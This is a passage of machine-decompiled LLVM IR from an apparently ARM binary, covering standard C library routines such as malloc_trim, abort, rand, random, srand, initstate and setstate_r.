  call void @__pseudo_cond_branch(i1 %v1_29c8c, i32 ptrtoint (i32* @global_var_29930.1780 to i32))
  %v0_29c90 = load i32, i32* @r4, align 4
  %v1_29c90 = add i32 %v0_29c90, 44
  %v2_29c90 = inttoptr i32 %v1_29c90 to i32*
  %v3_29c90 = load i32, i32* %v2_29c90, align 4
  store i32 %v3_29c90, i32* %r3.global-to-local, align 4
  %v1_29c94 = add i32 %v3_29c90, 4
  %v2_29c94 = inttoptr i32 %v1_29c94 to i32*
  %v3_29c94 = load i32, i32* %v2_29c94, align 4
  store i32 %v3_29c94, i32* %r3.global-to-local, align 4
  %v1_29c98 = add i32 %v0_29c90, 836
  %v2_29c98 = inttoptr i32 %v1_29c98 to i32*
  %v3_29c98 = load i32, i32* %v2_29c98, align 4
  store i32 %v3_29c98, i32* %r2.global-to-local, align 4
  %v1_29c9c = and i32 %v3_29c94, -4
  store i32 %v1_29c9c, i32* %r3.global-to-local, align 4
  %v3_29ca0 = icmp ult i32 %v1_29c9c, %v3_29c98
  br i1 %v3_29ca0, label %dec_label_pc_29ce0, label %dec_label_pc_29ca8

dec_label_pc_29ca8:                               ; preds = %bb15
  store i32 %v0_29c90, i32* %r1.global-to-local, align 4
  %v1_29cac = add i32 %v0_29c90, 840
  %v2_29cac = inttoptr i32 %v1_29cac to i32*
  %v3_29cac = load i32, i32* %v2_29cac, align 4
  store i32 %v3_29cac, i32* %r0.global-to-local, align 4
  %v2_29cb0 = call i32 @__malloc_trim(i32 %v3_29cac, i32 %v0_29c90)
  store i32 %v2_29cb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29ce0

dec_label_pc_29cb8:                               ; preds = %dec_label_pc_29b7c
  %v2_29cb8 = inttoptr i32 %v1_29b4c to i32*
  %v3_29cb8 = load i32, i32* %v2_29cb8, align 4
  store i32 %v3_29cb8, i32* %r0.global-to-local, align 4
  %v1_29cbc = add i32 %v4_29b3c, 848
  %v2_29cbc = inttoptr i32 %v1_29cbc to i32*
  %v3_29cbc = load i32, i32* %v2_29cbc, align 4
  store i32 %v3_29cbc, i32* %r2.global-to-local, align 4
  %v1_29cc0 = add i32 %v4_29b3c, 868
  %v2_29cc0 = inttoptr i32 %v1_29cc0 to i32*
  %v3_29cc0 = load i32, i32* %v2_29cc0, align 4
  %v2_29cc4 = add i32 %v3_29cb8, %v1_29b48
  store i32 %v2_29cc4, i32* %r1.global-to-local, align 4
  %v1_29cc8 = add i32 %v3_29cbc, -1
  store i32 %v1_29cc8, i32* %r2.global-to-local, align 4
  %v2_29ccc = sub i32 %v3_29cc0, %v2_29cc4
  store i32 %v2_29ccc, i32* %r3.global-to-local, align 4
  store i32 %v2_29ccc, i32* %v2_29cc0, align 4
  %v0_29cd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_29cd4 = load i32, i32* @lr, align 4
  %v2_29cd4 = add i32 %v1_29cd4, 848
  %v3_29cd4 = inttoptr i32 %v2_29cd4 to i32*
  store i32 %v0_29cd4, i32* %v3_29cd4, align 4
  %v0_29cd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_29cd8 = load i32, i32* @r5, align 4
  %v2_29cd8 = sub i32 %v1_29cd8, %v0_29cd8
  store i32 %v2_29cd8, i32* %r0.global-to-local, align 4
  %v2_29cdc = call i32 @munmap(i32 %v2_29cd8, i32 %v2_29cc4)
  store i32 %v2_29cdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29ce0

dec_label_pc_29ce0:                               ; preds = %bb15, %dec_label_pc_29c70, %dec_label_pc_29ca8, %dec_label_pc_29b5c, %dec_label_pc_29cb8
  store i32 %v2_29af0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_29cec = load i32, i32* @r7, align 4
  %v2_29cec = add i32 %v0_29cec, 76
  %v3_29cec = inttoptr i32 %v2_29cec to i32*
  %v4_29cec = load i32, i32* %v3_29cec, align 4
  store i32 %v4_29cec, i32* @ip, align 4
  store i32 171256, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29cec)
  br label %dec_label_pc_29cf8

dec_label_pc_29cf8:                               ; preds = %entry, %dec_label_pc_29ce0
  store i32 %v3_29ae4, i32* @r4, align 4
  store i32 %v6_29ae4, i32* @r5, align 4
  store i32 %v9_29ae4, i32* @r6, align 4
  store i32 %v12_29ae4, i32* @r7, align 4
  store i32 %v18_29ae4, i32* @lr, align 4
  ret i32 %v2_29af0

; uselistorder directives
  uselistorder i32 %v0_29c90, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_29c50, { 1, 0 }
  uselistorder i32 %v1_29b90, { 1, 0 }
  uselistorder i32 %v0_29b90, { 1, 0 }
  uselistorder i32 %v3_29b64, { 1, 0 }
  uselistorder i32 %v1_29b48, { 1, 0, 2 }
  uselistorder i32 %v2_29b44, { 1, 2, 0, 3 }
  uselistorder i32 %v4_29b3c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_29aec, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 6, 5, 7, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 848, { 3, 4, 0, 1, 2 }
  uselistorder i32 840, { 1, 2, 0 }
  uselistorder i32 836, { 2, 3, 0, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 156) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_29cf8, { 1, 0 }
  uselistorder label %dec_label_pc_29ce0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_29c70, { 1, 0 }
  uselistorder label %dec_label_pc_29c30, { 1, 0 }
  uselistorder label %dec_label_pc_29c24, { 1, 0 }
  uselistorder label %dec_label_pc_29c20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_29bd4, { 1, 0 }
}

define i32 @function_29d08(i32 %arg1) local_unnamed_addr {
dec_label_pc_29d08:
  %v0_29d08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29d08, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_29d08
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_29d08, %bb
  %v4_29d1c = phi i32 [ %arg1, %dec_label_pc_29d08 ], [ 0, %bb ]
  ret i32 %v4_29d1c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_29d20 = load i32, i32* @r4, align 4
  store i32 %v3_29d20, i32* %stack_var_-12, align 4
  %v6_29d20 = load i32, i32* @r5, align 4
  %v4_29d30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_29d30, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_29d30, i32* @r0, align 4
  %v0_29d40 = call i32 @__malloc_consolidate()
  %v0_29d44 = load i32, i32* @r4, align 4
  %v0_29d48 = load i32, i32* @r5, align 4
  %v2_29d50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_29d50, i32* @r4, align 4
  store i32 %v6_29d20, i32* @r5, align 4
  %v2_29d54 = call i32 @__malloc_trim(i32 %v0_29d44, i32 %v0_29d48)
  %v0_29d58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29d58, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_29d58 = load i32, i32* @ip, align 4
  %v8_29d5c = ashr i32 %v2_29d58, %v2_29d54
  %v9_29d5c = and i32 %v8_29d5c, %v2_29d54
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v10_29d5c = phi i32 [ %v2_29d54, %entry ], [ %v9_29d5c, %bb ]
  ret i32 %v10_29d5c

; uselistorder directives
  uselistorder i32 %v2_29d54, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_29d78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), align 4
  store i32 171396, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29d78)
  %v2_29d94 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_29da0 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_29d94, i32 0)
  %v0_29da8 = load i32, i32* @r5, align 4
  %v2_29da8 = add i32 %v0_29da8, 55676
  %v3_29da8 = inttoptr i32 %v2_29da8 to i32*
  %v4_29da8 = load i32, i32* %v3_29da8, align 4
  %v2_29dac = icmp eq i32 %v4_29da8, 0
  br i1 %v2_29dac, label %dec_label_pc_29db4, label %dec_label_pc_29df4

dec_label_pc_29db4:                               ; preds = %entry
  store i32 1, i32* %v3_29da8, align 4
  br label %dec_label_pc_29dbc

dec_label_pc_29dbc:                               ; preds = %dec_label_pc_29e04, %dec_label_pc_29db4
  %v0_29dc0 = load i32, i32* @r5, align 4
  %v2_29dc0 = add i32 %v0_29dc0, 20592
  store i32 %v2_29dc0, i32* @r4, align 4
  %v2_29dcc = add i32 %v0_29dc0, 96
  %v3_29dcc = inttoptr i32 %v2_29dcc to i32*
  %v4_29dcc = load i32, i32* %v3_29dcc, align 4
  store i32 171480, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29dcc)
  %v1_29ddc = call i32 @__GI_raise(i32 6)
  %v0_29de8 = load i32, i32* @r5, align 4
  %v2_29de8 = add i32 %v0_29de8, 36
  %v3_29de8 = inttoptr i32 %v2_29de8 to i32*
  %v4_29de8 = load i32, i32* %v3_29de8, align 4
  store i32 171508, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29de8)
  %v0_29df8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_29df4

dec_label_pc_29df4:                               ; preds = %entry, %dec_label_pc_29dbc
  %v1_29e0c = phi i32 [ %v0_29da8, %entry ], [ %v0_29df8.pre, %dec_label_pc_29dbc ]
  %v2_29df8 = add i32 %v1_29e0c, 55676
  %v3_29df8 = inttoptr i32 %v2_29df8 to i32*
  %v4_29df8 = load i32, i32* %v3_29df8, align 4
  %v7_29dfc = icmp eq i32 %v4_29df8, 1
  br i1 %v7_29dfc, label %dec_label_pc_29e04, label %dec_label_pc_29e40

dec_label_pc_29e04:                               ; preds = %dec_label_pc_29df4
  %v2_29e04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_29e04, i32* @r4, align 4
  store i32 2, i32* %v3_29df8, align 4
  store i32 %v2_29e04, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_29e1c = call i32 @__GI_memset()
  %v4_29e38 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-28, i32 0)
  br label %dec_label_pc_29dbc

dec_label_pc_29e40:                               ; preds = %dec_label_pc_29df4
  %v7_29e40 = icmp eq i32 %v4_29df8, 2
  br i1 %v7_29e40, label %dec_label_pc_29e48, label %dec_label_pc_29e54

dec_label_pc_29e48:                               ; preds = %dec_label_pc_29e40
  store i32 3, i32* %v3_29df8, align 4
  %v0_29e50 = call i32 @abort()
  %v0_29e54.pre = load i32, i32* @r5, align 4
  %v1_29e54.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_29e54

dec_label_pc_29e54:                               ; preds = %dec_label_pc_29e40, %dec_label_pc_29e48
  %v3_29e60 = phi i32 [ 55676, %dec_label_pc_29e40 ], [ %v1_29e54.pre, %dec_label_pc_29e48 ]
  %v2_29e60 = phi i32 [ %v1_29e0c, %dec_label_pc_29e40 ], [ %v0_29e54.pre, %dec_label_pc_29e48 ]
  %v2_29e54 = add i32 %v2_29e60, %v3_29e60
  %v3_29e54 = inttoptr i32 %v2_29e54 to i32*
  %v4_29e54 = load i32, i32* %v3_29e54, align 4
  %v7_29e58 = icmp eq i32 %v4_29e54, 3
  br i1 %v7_29e58, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_29e54
  store i32 4, i32* %v3_29e54, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_29e54, %bb
  call void @__pseudo_cond_branch(i1 %v7_29e58, i32 ptrtoint (i32* @global_var_23554.1789 to i32))
  br label %dec_label_pc_29e6c

dec_label_pc_29e6c:                               ; preds = %dec_label_pc_29e6c, %.thread1
  %v0_29e6c = call i32 @abort()
  br label %dec_label_pc_29e6c

; uselistorder directives
  uselistorder i32* %v3_29df8, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 8, 10, 4, 3, 2, 1, 7, 6, 9, 5, 11 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), { 4, 0, 1, 2, 3 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_29e54, { 1, 0 }
  uselistorder label %dec_label_pc_29df4, { 1, 0 }
}

define i32 @function_29e78(i32 %arg1) local_unnamed_addr {
dec_label_pc_29e78:
  %v0_29e78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29e78, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_29e78
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_29e78, %bb
  %v5_29e84 = phi i32 [ %arg1, %dec_label_pc_29e78 ], [ 0, %bb ]
  ret i32 %v5_29e84

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_29e90 = call i32 @random()
  ret i32 %v0_29e90
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_29ea0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_29ed0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_29ed0)
  %v0_29ee4 = load i32, i32* @r4, align 4
  %v2_29ee4 = add i32 %v0_29ee4, 36
  %v3_29ee4 = inttoptr i32 %v2_29ee4 to i32*
  %v4_29ee4 = load i32, i32* %v3_29ee4, align 4
  store i32 ptrtoint (i32* @global_var_29ef0.1795 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29ee4)
  %v2_29ef4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_29ef8 = load i32, i32* @r4, align 4
  %v2_29ef8 = add i32 %v0_29ef8, 20768
  %v2_29efc = inttoptr i32 %v2_29ef8 to i32*
  %v3_29efc = call i32 @__GI_random_r(i32* %v2_29efc, i32 %v2_29ef4)
  %v0_29f0c = load i32, i32* @r4, align 4
  %v2_29f0c = add i32 %v0_29f0c, 76
  %v3_29f0c = inttoptr i32 %v2_29f0c to i32*
  %v4_29f0c = load i32, i32* %v3_29f0c, align 4
  store i32 %v4_29f0c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_29f0c)
  %v3_29f18 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_29ea0, i32* @r4, align 4
  ret i32 %v3_29f18
}

define i32 @function_29f2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_29f2c:
  %v0_29f2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29f2c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_29f2c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_29f2c, %bb
  %v4_29f40 = phi i32 [ %arg1, %dec_label_pc_29f2c ], [ 0, %bb ]
  ret i32 %v4_29f40

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_29f74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_29f74)
  %v0_29f88 = load i32, i32* @r6, align 4
  %v2_29f88 = add i32 %v0_29f88, 36
  %v3_29f88 = inttoptr i32 %v2_29f88 to i32*
  %v4_29f88 = load i32, i32* %v3_29f88, align 4
  call void @__pseudo_branch(i32 %v4_29f88)
  %v0_29f98 = load i32, i32* @r6, align 4
  %v2_29f98 = add i32 %v0_29f98, 20768
  %v0_29fa0 = load i32, i32* @r5, align 4
  %v1_29fa4 = add i32 %v0_29f98, 20776
  %v2_29fa4 = inttoptr i32 %v1_29fa4 to i32*
  %v3_29fa4 = load i32, i32* %v2_29fa4, align 4
  store i32 %v3_29fa4, i32* @r4, align 4
  %v2_29fa8 = inttoptr i32 %v2_29f98 to i32*
  %v3_29fa8 = call i32 @setstate_r(i32 %v0_29fa0, i32* %v2_29fa8)
  %v1_29fb0 = icmp slt i32 %v3_29fa8, 0
  %v3_29fc0 = load i32, i32* @r4, align 4
  %v4_29fc0 = add i32 %v3_29fc0, -4
  %storemerge = select i1 %v1_29fb0, i32 0, i32 %v4_29fc0
  %v0_29fc4 = load i32, i32* @r6, align 4
  %v2_29fc4 = add i32 %v0_29fc4, 76
  %v3_29fc4 = inttoptr i32 %v2_29fc4 to i32*
  %v4_29fc4 = load i32, i32* %v3_29fc4, align 4
  call void @__pseudo_branch(i32 %v4_29fc4)
  ret i32 %storemerge
}

define i32 @function_29fe4(i32 %arg1) local_unnamed_addr {
dec_label_pc_29fe4:
  %v0_29fe4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29fe4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_29fe4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_29fe4, %bb
  %v4_29ff8 = phi i32 [ %arg1, %dec_label_pc_29fe4 ], [ 0, %bb ]
  ret i32 %v4_29ff8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_2a034 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2a034)
  %v0_2a048 = load i32, i32* @r4, align 4
  %v2_2a048 = add i32 %v0_2a048, 36
  %v3_2a048 = inttoptr i32 %v2_2a048 to i32*
  %v4_2a048 = load i32, i32* %v3_2a048, align 4
  call void @__pseudo_branch(i32 %v4_2a048)
  %v0_2a058 = load i32, i32* @r6, align 4
  %v0_2a05c = load i32, i32* @r4, align 4
  %v2_2a05c = add i32 %v0_2a05c, 20768
  %v0_2a060 = load i32, i32* @r7, align 4
  %v0_2a064 = load i32, i32* @sl, align 4
  store i32 %v0_2a064, i32* @r0, align 4
  %v1_2a068 = add i32 %v0_2a05c, 20776
  %v2_2a068 = inttoptr i32 %v1_2a068 to i32*
  %v3_2a068 = load i32, i32* %v2_2a068, align 4
  store i32 %v3_2a068, i32* @r5, align 4
  %v4_2a06c = inttoptr i32 %v0_2a064 to i32*
  %v5_2a06c = call i32 @__GI_initstate_r(i32* %v4_2a06c, i32 %v0_2a058, i32 %v0_2a060, i32 %v2_2a05c)
  %v0_2a07c = load i32, i32* @r4, align 4
  %v2_2a07c = add i32 %v0_2a07c, 76
  %v3_2a07c = inttoptr i32 %v2_2a07c to i32*
  %v4_2a07c = load i32, i32* %v3_2a07c, align 4
  call void @__pseudo_branch(i32 %v4_2a07c)
  %v0_2a088 = load i32, i32* @r5, align 4
  %v1_2a088 = add i32 %v0_2a088, -4
  ret i32 %v1_2a088
}

define i32 @function_2a0a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_2a0a4:
  %v0_2a0a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a0a4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2a0a4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2a0a4, %bb
  %v4_2a0b8 = phi i32 [ %arg1, %dec_label_pc_2a0a4 ], [ 0, %bb ]
  ret i32 %v4_2a0b8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_2a0bc = load i32, i32* @r4, align 4
  %v6_2a0bc = load i32, i32* @r5, align 4
  %v9_2a0bc = load i32, i32* @r6, align 4
  %v15_2a0bc = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v2_2a0d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20616), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_2a0ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2a0ec)
  %v0_2a100 = load i32, i32* @r4, align 4
  %v2_2a100 = add i32 %v0_2a100, 36
  %v3_2a100 = inttoptr i32 %v2_2a100 to i32*
  %v4_2a100 = load i32, i32* %v3_2a100, align 4
  call void @__pseudo_branch(i32 %v4_2a100)
  %v0_2a110 = load i32, i32* @r6, align 4
  store i32 %v0_2a110, i32* @r0, align 4
  %v0_2a114 = load i32, i32* @r4, align 4
  %v2_2a114 = add i32 %v0_2a114, 20768
  %v2_2a118 = inttoptr i32 %v0_2a110 to i32*
  %v3_2a118 = call i32 @srandom_r(i32* %v2_2a118, i32 %v2_2a114)
  %v0_2a12c = load i32, i32* @r4, align 4
  %v2_2a12c = add i32 %v0_2a12c, 76
  %v3_2a12c = inttoptr i32 %v2_2a12c to i32*
  %v4_2a12c = load i32, i32* %v3_2a12c, align 4
  call void @__pseudo_branch(i32 %v4_2a12c)
  store i32 %v3_2a0bc, i32* @r4, align 4
  store i32 %v6_2a0bc, i32* @r5, align 4
  store i32 %v9_2a0bc, i32* @r6, align 4
  store i32 %v15_2a0bc, i32* @lr, align 4
  ret i32 %v2_2a0d0
}

define i32 @function_2a148(i32 %arg1) local_unnamed_addr {
dec_label_pc_2a148:
  %v0_2a148 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a148, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2a148
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2a148, %bb
  %v4_2a15c = phi i32 [ %arg1, %dec_label_pc_2a148 ], [ 0, %bb ]
  ret i32 %v4_2a15c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2a160 = load i32, i32* @r4, align 4
  store i32 %v3_2a160, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_2a168 = add i32 %tmp, 12
  %v2_2a168 = inttoptr i32 %v1_2a168 to i8*
  %v3_2a168 = load i8, i8* %v2_2a168, align 1
  %v4_2a168 = zext i8 %v3_2a168 to i32
  store i32 %v4_2a168, i32* %r1.global-to-local, align 4
  %v2_2a16c = icmp eq i8 %v3_2a168, 0
  store i1 %v2_2a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2a16c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_2a17412 = add i32 %arg1, 4
  store i32 %v1_2a17412, i32* %r6.global-to-local, align 4
  %v1_2a17813 = add i32 %tmp, 8
  %v2_2a17814 = inttoptr i32 %v1_2a17813 to i32*
  %v3_2a17815 = load i32, i32* %v2_2a17814, align 4
  store i32 %v3_2a17815, i32* %r0.global-to-local, align 4
  %v3_2a194 = add i32 %v3_2a17815, -4
  %v4_2a194 = inttoptr i32 %v3_2a194 to i32*
  store i32 %v4_2a168, i32* %v4_2a194, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_2a170 = add i32 %tmp, 4
  %v3_2a170 = inttoptr i32 %v2_2a170 to i32*
  %v4_2a170 = load i32, i32* %v3_2a170, align 4
  %v1_2a174 = add i32 %arg1, 4
  store i32 %v1_2a174, i32* %r6.global-to-local, align 4
  %v1_2a178 = add i32 %tmp, 8
  %v2_2a178 = inttoptr i32 %v1_2a178 to i32*
  %v3_2a178 = load i32, i32* %v2_2a178, align 4
  store i32 %v3_2a178, i32* %r0.global-to-local, align 4
  %v3_2a180 = sub i32 %v4_2a170, %v3_2a178
  %v4_2a184 = sdiv i32 %v3_2a180, 4
  %v4_2a188 = sext i8 %v3_2a168 to i32
  store i32 %v4_2a188, i32* %r1.global-to-local, align 4
  %v4_2a190 = mul i32 %v4_2a184, 5
  %v5_2a190 = add i32 %v4_2a190, %v4_2a188
  %v3_2a198 = add i32 %v3_2a178, -4
  %v4_2a198 = inttoptr i32 %v3_2a198 to i32*
  store i32 %v5_2a190, i32* %v4_2a198, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_2a1a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_2a1a0 = add i32 %v0_2a1a0, -4
  %v2_2a1a0 = inttoptr i32 %v1_2a1a0 to i32*
  %v3_2a1a0 = load i32, i32* %v2_2a1a0, align 4
  %v2_2a1a8 = udiv i32 %v3_2a1a0, 5
  %v3_2a1a8 = urem i32 %v3_2a1a0, 5
  store i32 %v2_2a1a8, i32* %r0.global-to-local, align 4
  store i32 %v3_2a1a8, i32* %r1.global-to-local, align 4
  %v2_2a1b0 = icmp ugt i32 %v3_2a1a8, 3
  %v7_2a1b0 = icmp eq i32 %v3_2a1a8, 4
  store i1 %v7_2a1b0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  %v2_2a1b8 = xor i1 %v7_2a1b0, true
  %v3_2a1b8 = and i1 %v2_2a1b0, %v2_2a1b8
  br i1 %v3_2a1b8, label %dec_label_pc_2a220, label %dec_label_pc_2a1bc

dec_label_pc_2a1bc:                               ; preds = %bb
  %v4_2a1c4 = mul nuw nsw i32 %v3_2a1a8, 4
  %v5_2a1c4 = add i32 %v4_2a1c4, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36228)
  %v1_2a1c8 = add i32 %v4_2a1c4, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36208)
  %v2_2a1c8 = inttoptr i32 %v1_2a1c8 to i32*
  %v3_2a1c8 = load i32, i32* %v2_2a1c8, align 4
  store i32 %v3_2a1c8, i32* %r5.global-to-local, align 4
  %v6_2a1cc = inttoptr i32 %v5_2a1c4 to i32*
  %v7_2a1cc = load i32, i32* %v6_2a1cc, align 4
  store i32 %v7_2a1cc, i32* %r7.global-to-local, align 4
  %v2_2a1d0 = icmp eq i32 %v3_2a1a8, 0
  store i1 %v2_2a1d0, i1* %cpsr_z.global-to-local, align 1
  %v1_2a1d4 = trunc i32 %v3_2a1c8 to i8
  %v2_2a1d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_2a1d4 = add i32 %v2_2a1d4, 13
  %v4_2a1d4 = inttoptr i32 %v3_2a1d4 to i8*
  store i8 %v1_2a1d4, i8* %v4_2a1d4, align 1
  %v0_2a1d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2a1d8 = trunc i32 %v0_2a1d8 to i8
  %v2_2a1d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_2a1d8 = add i32 %v2_2a1d8, 14
  %v4_2a1d8 = inttoptr i32 %v3_2a1d8 to i8*
  store i8 %v1_2a1d8, i8* %v4_2a1d8, align 1
  %v0_2a1dc = load i32, i32* %r1.global-to-local, align 4
  %v1_2a1dc = trunc i32 %v0_2a1dc to i8
